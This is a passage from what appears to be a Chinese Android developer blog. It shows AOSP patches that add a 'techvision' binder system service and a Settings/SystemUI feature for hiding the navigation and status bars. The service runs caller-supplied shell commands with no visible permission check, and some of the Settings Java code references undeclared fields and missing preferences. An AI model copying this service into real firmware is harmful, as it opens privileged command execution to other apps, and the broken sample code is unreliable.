class="line">+    pclose(pipe);</span><br><span class="line">+</span><br><span class="line">+    ALOGD(&quot;service::executeCommand&quot;);</span><br><span class="line">+</span><br><span class="line">+    callback-&gt;onCommandCompleted(0, String16(result.c_str()));</span><br><span class="line">+    </span><br><span class="line">+    return binder::Status::ok();</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/core/java/android/techvision/service/TechvisionService.h b/core/java/android/techvision/service/TechvisionService.h</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..fd8dc87c304</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/techvision/service/TechvisionService.h</span><br><span class="line">@@ -0,0 +1,26 @@</span><br><span class="line">+#include &lt;android/app/BnTechvisionService.h&gt;</span><br><span class="line">+#include &lt;android/app/BnTechvisionCallback.h&gt;</span><br><span class="line">+#include &lt;binder/BinderService.h&gt;</span><br><span class="line">+</span><br><span class="line">+namespace android &#123;</span><br><span class="line">+namespace app &#123;</span><br><span class="line">+ </span><br><span class="line">+class TechvisionService : </span><br><span class="line">+    public ::android::BinderService&lt;TechvisionService&gt;,</span><br><span class="line">+    public BnTechvisionService&#123;</span><br><span class="line">+friend class BinderService&lt;TechvisionService&gt;;</span><br><span class="line">+</span><br><span class="line">+public:</span><br><span class="line">+    TechvisionService();</span><br><span class="line">+    ~TechvisionService();</span><br><span class="line">+    static const String16  getServiceName() &#123; return String16(&quot;techvision&quot;); &#125;</span><br><span class="line">+    binder::Status executeCommand(const ::android::String16&amp; command, const sp&lt;ITechvisionCallback&gt;&amp; callback) override;</span><br><span class="line">+    virtual void onFirstRef();</span><br><span class="line">+ </span><br><span class="line">+private:</span><br><span class="line">+    sp&lt;ITechvisionCallback&gt; mCallback;</span><br><span class="line">+&#125;;</span><br><span class="line">+</span><br><span class="line">+&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+ </span><br><span class="line">diff --git a/core/java/android/techvision/service/aidl/android/app/ITechvisionCallback.aidl b/core/java/android/techvision/service/aidl/android/app/ITechvisionCallback.aidl</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..a788a4c1eeb</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/techvision/service/aidl/android/app/ITechvisionCallback.aidl</span><br><span class="line">@@ -0,0 +1,5 @@</span><br><span class="line">+package android.app;</span><br><span class="line">+ </span><br><span class="line">+interface ITechvisionCallback&#123;</span><br><span class="line">+    oneway void onCommandCompleted(int status, String msg);</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br><span class="line">diff --git a/core/java/android/techvision/service/aidl/android/app/ITechvisionService.aidl b/core/java/android/techvision/service/aidl/android/app/ITechvisionService.aidl</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..705dff053b6</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/techvision/service/aidl/android/app/ITechvisionService.aidl</span><br><span class="line">@@ -0,0 +1,6 @@</span><br><span class="line">+package android.app;</span><br><span class="line">+import android.app.ITechvisionCallback;</span><br><span class="line">+ </span><br><span class="line">+interface ITechvisionService&#123;</span><br><span class="line">+    void executeCommand(String command, ITechvisionCallback callback);</span><br><span class="line">+&#125;</span><br><span class="line">\ No newline at end of file</span><br></pre></td></tr></table></figure><h3 id="3-2-调用服务端"><a href="#3-2-调用服务端" class="headerlink" title="3.2 调用服务端"></a>3.2 调用服务端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/Android.mk b/Android.mk</span><br><span class="line">index ad4ad997f25..79519820ef5 100755</span><br><span class="line">--- a/Android.mk</span><br><span class="line">+++ b/Android.mk</span><br><span class="line">@@ -93,6 +93,8 @@ LOCAL_SRC_FILES += \</span><br><span class="line"> core/java/android/app/IUserSwitchObserver.aidl \</span><br><span class="line"> core/java/android/app/IWallpaperManager.aidl \</span><br><span class="line"> core/java/android/app/IWallpaperManagerCallback.aidl \</span><br><span class="line">+core/java/android/app/ITechvisionService.aidl \</span><br><span class="line">+core/java/android/app/ITechvisionCallback.aidl \</span><br><span class="line"> core/java/android/app/admin/IDevicePolicyManager.aidl \</span><br><span class="line"> core/java/android/app/trust/IStrongAuthTracker.aidl \</span><br><span class="line"> core/java/android/app/trust/ITrustManager.aidl \</span><br><span class="line">diff --git a/core/java/android/app/TechvisionServiceManager.java b/core/java/android/app/TechvisionServiceManager.java</span><br><span class="line">new file mode 100644</span><br><span class="line">index 00000000000..8417ee1d76a</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/core/java/android/app/TechvisionServiceManager.java</span><br><span class="line">@@ -0,0 +1,44 @@</span><br><span class="line">+package android.app;</span><br><span class="line">+</span><br><span class="line">+import android.os.IBinder;</span><br><span class="line">+import android.os.RemoteException;</span><br><span class="line">+import android.os.ServiceManager;</span><br><span class="line">+import android.os.Handler;</span><br><span class="line">+import android.os.Message;</span><br><span class="line">+import android.os.Bundle;</span><br><span class="line">+import android.util.Log;</span><br><span class="line">+import android.app.ITechvisionService;</span><br><span class="line">+import android.app.ITechvisionCallback;</span><br><span class="line">+</span><br><span class="line">+public class TechvisionServiceManager&#123;</span><br><span class="line">+    private static final String TAG = &quot;hukaichaoJavaClient&quot;;</span><br><span class="line">+    private ITechvisionService mService;</span><br><span class="line">+</span><br><span class="line">+    public TechvisionServiceManager()&#123;</span><br><span class="line">+        Log.d(TAG, &quot;TechvisionServiceManager&quot;);</span><br><span class="line">+        IBinder binder = ServiceManager.getService(&quot;techvision&quot;);</span><br><span class="line">+        mService = ITechvisionService.Stub.asInterface(binder); </span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    private ITechvisionCallback techvisionCallback = new ITechvisionCallback.Stub() &#123;</span><br><span class="line">+        @Override</span><br><span class="line">+        public void onCommandCompleted(int status, String msg) &#123;</span><br><span class="line">+            if(status == 0)&#123;</span><br><span class="line">+                Log.d(TAG, &quot;onCommandCompleted, status = &quot;+status+&quot;, msg = &quot;+msg);</span><br><span class="line">+            &#125; else &#123;</span><br><span class="line">+                Log.e(TAG, &quot;CompletedError, status = &quot;+status+&quot;, msg = &quot;+msg);</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+    public void execute(String command)&#123;</span><br><span class="line">+        try&#123;</span><br><span class="line">+            mService.executeCommand(command, techvisionCallback);</span><br><span class="line">+        &#125;catch (Throwable e)&#123;</span><br><span class="line">+            e.printStackTrace();</span><br><span class="line">+            Log.e(TAG,&quot;execute &quot;+e.getMessage());</span><br><span class="line">+        &#125;</span><br><span class="line">+        </span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SystemUI学习</title>
    <link href="/2023/08/21/SystemUI%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/08/21/SystemUI%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="1，在Settings中添加导航栏控制器的UI界面。"><a href="#1，在Settings中添加导航栏控制器的UI界面。" class="headerlink" title="1，在Settings中添加导航栏控制器的UI界面。"></a>1，在Settings中添加导航栏控制器的UI界面。</h2><p>最开始有尝试在Settings的一级菜单中添加一栏——导航栏控制。但失败了，照着网上的教程操作就是不显示（猜测原因是没照着一级菜单主要的xml文件）</p><p>无奈下改为在二级菜单中添加，二级菜单中添加就简单多了。</p><p>在res&#x2F;xml&#x2F;display_settings.xml中添加一栏 NAVIGATION 然后创建对应的NavigationBarSettings.java 和 navigation_settings.xml文件即可</p><p>补丁：<a href="mailto:&#114;&#107;&#x37;&#x31;&#x2d;&#x70;&#97;&#99;&#x6b;&#97;&#103;&#101;&#x73;&#45;&#x61;&#x70;&#112;&#x73;&#45;&#115;&#x65;&#x74;&#116;&#x69;&#110;&#x67;&#x73;&#x40;&#97;&#x64;&#100;&#x5f;&#117;&#105;&#x5f;&#x66;&#x6f;&#114;&#x5f;&#x6e;&#97;&#118;&#x69;&#103;&#97;&#116;&#x69;&#111;&#x6e;&#x5f;&#98;&#97;&#114;&#46;&#x70;&#x61;&#x74;&#x63;&#x68;">&#114;&#107;&#x37;&#x31;&#x2d;&#x70;&#97;&#99;&#x6b;&#97;&#103;&#101;&#x73;&#45;&#x61;&#x70;&#112;&#x73;&#45;&#115;&#x65;&#x74;&#116;&#x69;&#110;&#x67;&#x73;&#x40;&#97;&#x64;&#100;&#x5f;&#117;&#105;&#x5f;&#x66;&#x6f;&#114;&#x5f;&#x6e;&#97;&#118;&#x69;&#103;&#97;&#116;&#x69;&#111;&#x6e;&#x5f;&#98;&#97;&#114;&#46;&#x70;&#x61;&#x74;&#x63;&#x68;</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/res/values/strings.xml b/res/values/strings.xml</span><br><span class="line">index 563ea0ed0d..a4cfcec2c6 100755</span><br><span class="line">--- a/res/values/strings.xml</span><br><span class="line">+++ b/res/values/strings.xml</span><br><span class="line">@@ -7983,4 +7983,7 @@</span><br><span class="line">     &lt;string name=&quot;color_temperature_mode_desc&quot;&gt;Color temperature mode&lt;/string&gt;</span><br><span class="line">     &lt;!-- temperature of the color for the display [CHAR LIMIT=60] --&gt;</span><br><span class="line">     &lt;string name=&quot;select_color_temperature_dialog_title&quot;&gt;Select Color temperature &lt;/string&gt;</span><br><span class="line">+</span><br><span class="line">+     &lt;string name=&quot;system_navigation_bar_settings_title&quot;&gt;Navigation&lt;/string&gt;</span><br><span class="line">+    </span><br><span class="line"> &lt;/resources&gt;</span><br><span class="line">diff --git a/res/xml/display_settings.xml b/res/xml/display_settings.xml</span><br><span class="line">index ad57326386..3fbe864844 100755</span><br><span class="line">--- a/res/xml/display_settings.xml</span><br><span class="line">+++ b/res/xml/display_settings.xml</span><br><span class="line">@@ -122,4 +122,9 @@</span><br><span class="line">                 android:summary=&quot;%s&quot;</span><br><span class="line">                 android:title=&quot;@string/display_vr_pref_title&quot; /&gt;</span><br><span class="line"> </span><br><span class="line">+        &lt;PreferenceScreen</span><br><span class="line">+                android:key=&quot;navigation_settings&quot;</span><br><span class="line">+                android:title=&quot;@string/system_navigation_bar_settings_title&quot;</span><br><span class="line">+                settings:keywords=&quot;@string/system_navigation_bar_settings_title&quot;</span><br><span class="line">+                android:fragment=&quot;com.android.settings.NavigationBarSettings&quot; /&gt;</span><br><span class="line"> &lt;/PreferenceScreen&gt;</span><br><span class="line">diff --git a/res/xml/navigation_settings.xml b/res/xml/navigation_settings.xml</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000000..52c4e42590</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/res/xml/navigation_settings.xml</span><br><span class="line">@@ -0,0 +1,54 @@</span><br><span class="line">+&lt;PreferenceScreen xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;</span><br><span class="line">+</span><br><span class="line">+    &lt;SwitchPreference</span><br><span class="line">+        android:key=&quot;navigation_settings&quot;</span><br><span class="line">+        android:title=&quot;Control Navigation Bar By Broadcast&quot;</span><br><span class="line">+        android:summary=&quot;Toggle this switch&quot;</span><br><span class="line">+        android:persistent=&quot;true&quot;</span><br><span class="line">+        android:defaultValue=&quot;false&quot; /&gt;</span><br><span class="line">+</span><br><span class="line">+    &lt;SwitchPreference</span><br><span class="line">+        android:key=&quot;statusbar_settings&quot;</span><br><span class="line">+        android:title=&quot;Control Status Bar By Broadcast&quot;</span><br><span class="line">+        android:summary=&quot;Toggle this switch&quot;</span><br><span class="line">+        android:defaultValue=&quot;false&quot;</span><br><span class="line">+        android:persistent=&quot;true&quot; /&gt;</span><br><span class="line">+</span><br><span class="line">+    &lt;SwitchPreference</span><br><span class="line">+        android:key=&quot;auto_hide_navigation&quot;</span><br><span class="line">+        android:title=&quot;Auto Hide Navigation Bar&quot;</span><br><span class="line">+        android:persistent=&quot;true&quot;</span><br><span class="line">+        android:summary=&quot;Toggle this switch&quot; /&gt;</span><br><span class="line">+</span><br><span class="line">+    &lt;SwitchPreference</span><br><span class="line">+        android:key=&quot;auto_hide_statusbar&quot;</span><br><span class="line">+        android:title=&quot;Auto Hide Status Bar&quot;</span><br><span class="line">+        android:persistent=&quot;true&quot;</span><br><span class="line">+        android:summary=&quot;Toggle this switch&quot; /&gt;</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">+&lt;/PreferenceScreen&gt;</span><br><span class="line">diff --git a/src/com/android/settings/NavigationBarSettings.java b/src/com/android/settings/NavigationBarSettings.java</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000000..990d4d0a9f</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/com/android/settings/NavigationBarSettings.java</span><br><span class="line">@@ -0,0 +1,136 @@</span><br><span class="line">+package com.android.settings;</span><br><span class="line">+</span><br><span class="line">+import android.content.Context;</span><br><span class="line">+import android.os.Bundle;</span><br><span class="line">+import android.preference.SwitchPreference;</span><br><span class="line">+import android.preference.Preference;</span><br><span class="line">+import android.preference.PreferenceFragment;</span><br><span class="line">+import android.preference.PreferenceScreen;</span><br><span class="line">+import android.provider.Settings;</span><br><span class="line">+import android.util.Log;</span><br><span class="line">+import android.content.Intent;</span><br><span class="line">+import android.os.UserHandle;</span><br><span class="line">+</span><br><span class="line">+public class NavigationBarSettings extends PreferenceFragment implements Preference.OnPreferenceChangeListener &#123;</span><br><span class="line">+</span><br><span class="line">+    private static final String TAG = &quot;hukaichao NavigationBarSettings&quot;;</span><br><span class="line">+</span><br><span class="line">+    private static final String KEY_NAVIGATION_SWITCH = &quot;navigation_settings&quot;;</span><br><span class="line">+</span><br><span class="line">+    private static final String KEY_STATUSBAR_SWITCH = &quot;statusbar_settings&quot;;</span><br><span class="line">+</span><br><span class="line">+    private static final String KEY_NAVIGATION_OBSERVER_SWITCH = &quot;navigation_observer_settings&quot;;</span><br><span class="line">+</span><br><span class="line">+    private static final String KEY_STATUSBAR_OBSERVER_SWITCH = &quot;statusbar_observer_settings&quot;;</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">+    private SwitchPreference navigationSwitch;</span><br><span class="line">+    private SwitchPreference statusbarSwitch;</span><br><span class="line">+    private SwitchPreference navigationObserverSwitch;</span><br><span class="line">+    private SwitchPreference statusbarObserverSwitch;</span><br><span class="line">+    private Context mContext;</span><br><span class="line">+</span><br><span class="line">+    @Override</span><br><span class="line">+    public void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">+        super.onCreate(savedInstanceState);</span><br><span class="line">+        addPreferencesFromResource(R.xml.navigation_settings);</span><br><span class="line">+</span><br><span class="line">+        mContext = getActivity();</span><br><span class="line">+        navigationSwitch = (SwitchPreference) findPreference(KEY_NAVIGATION_SWITCH);</span><br><span class="line">+        statusbarSwitch = (SwitchPreference) findPreference(KEY_STATUSBAR_SWITCH);</span><br><span class="line">+        navigationObserverSwitch = (SwitchPreference) findPreference(KEY_NAVIGATION_OBSERVER_SWITCH);</span><br><span class="line">+        statusbarObserverSwitch = (SwitchPreference) findPreference(KEY_STATUSBAR_OBSERVER_SWITCH);</span><br><span class="line">+</span><br><span class="line">+        navigationSwitch.setOnPreferenceChangeListener(this);</span><br><span class="line">+        statusbarSwitch.setOnPreferenceChangeListener(this);</span><br><span class="line">+        navigationObserverSwitch.setOnPreferenceChangeListener(this);</span><br><span class="line">+        statusbarObserverSwitch.setOnPreferenceChangeListener(this);</span><br><span class="line">+</span><br><span class="line">+        PreferenceScreen preferenceScreen = getPreferenceScreen();</span><br><span class="line">+        </span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line">+    @Override</span><br><span class="line">+    public boolean onPreferenceChange(Preference preference, Object newValue) &#123;</span><br><span class="line">+        if (preference == navigationSwitch) &#123;</span><br><span class="line">+            boolean isChecked = (boolean) newValue;</span><br><span class="line">+            if (isChecked) &#123;</span><br><span class="line">+                Intent i = new Intent(&quot;com.android.systemui.statusbar.shownavigation&quot;);</span><br><span class="line">+                mContext.sendBroadcast(i);</span><br><span class="line">+                Log.d(TAG,&quot;show navigation bar&quot;);</span><br><span class="line">+</span><br><span class="line">+            &#125; else &#123;</span><br><span class="line">+                Intent i = new Intent(&quot;com.android.systemui.statusbar.hidenavigation&quot;);</span><br><span class="line">+                mContext.sendBroadcast(i);</span><br><span class="line">+                Log.d(TAG,&quot;hide navigation bar&quot;);</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+        else if (preference == statusbarSwitch) &#123;</span><br><span class="line">+            boolean isChecked = (boolean) newValue;</span><br><span class="line">+            if (isChecked) &#123;</span><br><span class="line">+                Intent i = new Intent(&quot;com.android.systemui.statusbar.showstatusbar&quot;);</span><br><span class="line">+                mContext.sendBroadcast(i);</span><br><span class="line">+                Log.d(TAG,&quot;show status bar&quot;);</span><br><span class="line">+</span><br><span class="line">+            &#125; else &#123;</span><br><span class="line">+                Intent i = new Intent(&quot;com.android.systemui.statusbar.hidestatusbar&quot;);</span><br><span class="line">+                mContext.sendBroadcast(i);</span><br><span class="line">+                Log.d(TAG,&quot;hide status bar&quot;);</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+        else if (preference == autoHideNavigationbar) &#123;</span><br><span class="line">+            boolean isChecked = (boolean) newValue;</span><br><span class="line">+            Settings.System.putInt(mContext.getContentResolver(), Settings.System.AUTO_HIDE_NAVIGATION_BAR, isChecked ? 1 : 0);</span><br><span class="line">+            Log.d(TAG,&quot;change auto hide navigation bar&quot;);</span><br><span class="line">+        &#125;</span><br><span class="line">+        else if (preference == autoHideStatusbar) &#123;</span><br><span class="line">+            boolean isChecked = (boolean) newValue;</span><br><span class="line">+            Settings.System.putInt(mContext.getContentResolver(), Settings.System.AUTO_HIDE_STATUS_BAR, isChecked ? 1 : 0);</span><br><span class="line">+            Log.d(TAG,&quot;change auto hide status bar&quot;);</span><br><span class="line">+        &#125;</span><br><span class="line">+        else if (preference == navigationObserverSwitch) &#123;</span><br><span class="line">+            boolean isChecked = (boolean) newValue;</span><br><span class="line">+            Settings.System.putInt(mContext.getContentResolver(), Settings.System.NAVIGATION_BAR_SHOW, isChecked ? 1 : 0);</span><br><span class="line">+            Log.d(TAG,&quot;change navigation bar observer&quot;);</span><br><span class="line">+        &#125;</span><br><span class="line">+        </span><br><span class="line">+        return true;</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure><h2 id="2，SystemUI接收广播以实现导航栏和状态栏的隐藏、自动隐藏和显示功能"><a href="#2，SystemUI接收广播以实现导航栏和状态栏的隐藏、自动隐藏和显示功能" class="headerlink" title="2，SystemUI接收广播以实现导航栏和状态栏的隐藏、自动隐藏和显示功能"></a>2，SystemUI接收广播以实现导航栏和状态栏的隐藏、自动隐藏和显示功能</h2><p>现象：</p><blockquote><p>该补丁创建好了广播接收器和执行相应的功能。<br>当收到广播为com.android.systemui.statusbar.shownavigation时，会展示导航栏<br>当收到广播为com.android.systemui.statusbar.hidenavigation时，会隐藏导航栏<br>当收到广播为com.android.systemui.statusbar.showstatusbar时，会展示状态栏<br>当收到广播为com.android.systemui.statusbar.hidestatusbar时，会隐藏状态栏<br>在开启自动隐藏导航栏&#x2F;自动隐藏状态栏按钮后，再点击开启导航栏、状态栏相关按钮，过3秒后会自动隐藏</p></blockquote><p>解决方案：</p><blockquote><p>在a&#x2F;packages&#x2F;SystemUI&#x2F;src&#x2F;com&#x2F;android&#x2F;systemui&#x2F;statusbar&#x2F;phone&#x2F;PhoneStatusBar.java文件中新创建了广播接收器，根据不同activity广播执行不同指令。<br>结合任务一提交补丁完成的UI界面的前两个按钮配合使用<br>这几个广播发送方是系统APP，所以需要在&#x2F;core&#x2F;res&#x2F;AndroidManifest.xml中声明，添加protected-broadcast，否则会报错Sending non-protected broadcast<br>这是为了提醒 系统应用开发者要将 broadcast 添加到protected-broadcast，因为非 protexted-broadcast 广播是可以被三方应用发送的。定义为 proected-broadcast 可以避免三方应用也发送这些广播来捣蛋。<br>在自动隐藏功能中，采用了观察者模式，在PhoneStatusBar.java类中添加了一个观察者，在system.Settings中定义了常量用来控制隐藏功能的开关。</p></blockquote><p>补丁<a href="mailto:&#114;&#107;&#55;&#x31;&#x2d;&#x66;&#x72;&#x61;&#x6d;&#101;&#x77;&#x6f;&#114;&#x6b;&#x73;&#x2d;&#x62;&#x61;&#115;&#x65;&#x40;&#99;&#111;&#x6e;&#116;&#x72;&#111;&#x6c;&#x5f;&#110;&#x61;&#118;&#x69;&#x67;&#97;&#x74;&#x69;&#x6f;&#110;&#x5f;&#97;&#110;&#x64;&#95;&#115;&#x74;&#x61;&#116;&#x75;&#115;&#95;&#98;&#x61;&#114;&#x5f;&#98;&#x79;&#95;&#98;&#114;&#x6f;&#x61;&#100;&#x63;&#x61;&#x73;&#116;&#115;&#46;&#x70;&#97;&#116;&#x63;&#104;">&#114;&#107;&#55;&#x31;&#x2d;&#x66;&#x72;&#x61;&#x6d;&#101;&#x77;&#x6f;&#114;&#x6b;&#x73;&#x2d;&#x62;&#x61;&#115;&#x65;&#x40;&#99;&#111;&#x6e;&#116;&#x72;&#111;&#x6c;&#x5f;&#110;&#x61;&#118;&#x69;&#x67;&#97;&#x74;&#x69;&#x6f;&#110;&#x5f;&#97;&#110;&#x64;&#95;&#115;&#x74;&#x61;&#116;&#x75;&#115;&#95;&#98;&#x61;&#114;&#x5f;&#98;&#x79;&#95;&#98;&#114;&#x6f;&#x61;&#100;&#x63;&#x61;&#x73;&#116;&#115;&#46;&#x70;&#97;&#116;&#x63;&#104;</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span 